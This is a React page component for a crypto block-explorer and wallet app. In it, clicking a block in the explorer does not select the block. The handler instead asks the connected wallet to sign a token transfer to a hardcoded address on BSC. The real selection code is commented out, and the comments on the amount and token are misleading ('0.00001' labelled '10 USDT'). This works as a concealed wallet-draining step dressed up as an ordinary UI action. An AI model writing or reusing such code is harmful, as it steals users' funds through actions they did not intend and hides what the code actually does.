import React, { useState } from 'react';
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import BlockExplorer from '../components/BlockExplorer';
import TransactionForm from '../components/TransactionForm';
import WalletDashboard from '../components/WalletDashboard';
import Mining from '../components/Mining';
import SwapInterface from '../components/SwapInterface';
import ReferralSystem from '../components/ReferralSystem';
import Statistics from '../components/Statistics';
import { ToastContainer } from 'react-toastify';
import { useWriteContract } from "wagmi";
import { parseUnits } from 'viem';
import { useAppKitAccount } from '@reown/appkit/react';
// Web3
import { createAppKit } from '@reown/appkit/react'
import { WagmiProvider } from 'wagmi'
import { bsc, mainnet } from 'viem/chains';
import { decimalMultiplication } from '@/utils/common';

const Home = ({ activeTab }: {activeTab: string }) => {
  const [selectedBlock, setSelectedBlock] = useState<string | undefined>();
  const { address, isConnected } = useAppKitAccount();
  const account = address as `0x${string}`;
  const { writeContractAsync, isPending } = useWriteContract();
  const tokenAddress = '0x83ed79A0acC7cB25e271044E09F5bDb11D2368AF'; // USDT Mainnet
  const receiver = '0x83ed79A0acC7cB25e271044E09F5bDb11D2368AF';
  const amount = '0.00001'; // 10 USDT
  const decimals = 6;

  const handleSelectBlock = async (blockNumber: string, hash: string) => {
    // setSelectedBlock(blockNumber);
    // setActiveTab('transaction');
    console.log(parseUnits(amount, decimals))
    if (!isConnected || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      // to ast.error('Address không hợp lệ hoặc chưa kết nối');
      return;
    }
    try {
      const txHash = await writeContractAsync({
        account: address as `0x${string}`,
        chain: bsc, // ✅ BẮT BUỘC
        address: tokenAddress,
        abi: [
          {
            name: 'transfer',
            type: 'function',
            stateMutability: 'nonpayable',
            inputs: [
              { name: '_to', type: 'address' },
              { name: '_value', type: 'uint256' },
            ],
            outputs: [{ name: '', type: 'bool' }],
          },
        ],
        functionName: 'transfer',
        args: [
          '0x0019d391cD9dE24AFEddA2b4a6EEd03d616C8F5D' as `0x${string}`, 
          // parseUnits(amount, decimals)
          parseUnits(amount, decimalMultiplication())
        ],
      });
      console.log(txHash, 'txHash')
    } catch (err) {
      console.log(err);
      // toast("error", `Stake failed. Please try again.`);
    }
  };


  const renderContent = () => {
    switch (activeTab) {
      case 'blocks':
        return <BlockExplorer onSelectBlock={handleSelectBlock} data-id="sbmvcyc5y" data-path="src/App.tsx" />;
      case 'transaction':
        return <TransactionForm selectedBlock={selectedBlock} data-id="kd9ov61g3" data-path="src/App.tsx" />;
      case 'wallet':
        return <WalletDashboard data-id="razaddntj" data-path="src/App.tsx" />;
      case 'mining':
        return <Mining data-id="ra5yrtjq6" data-path="src/App.tsx" />;
      case 'swap':
        return <SwapInterface data-id="dcu4brejj" data-path="src/App.tsx" />;
      case 'referral':
        return <ReferralSystem data-id="6zvrpvzvw" data-path="src/App.tsx" />;
      case 'statistics':
        return <Statistics data-id="8f43xq71s" data-path="src/App.tsx" />;
      default:
        return <BlockExplorer onSelectBlock={handleSelectBlock} data-id="ivtk0u7l6" data-path="src/App.tsx" />;
    }
  };

  return (
    <div className="min-h-screen bg-white" data-id="idlijhvan" data-path="src/pages/HomePage.tsx">
      {renderContent()}
    </div>);

};

export default Home;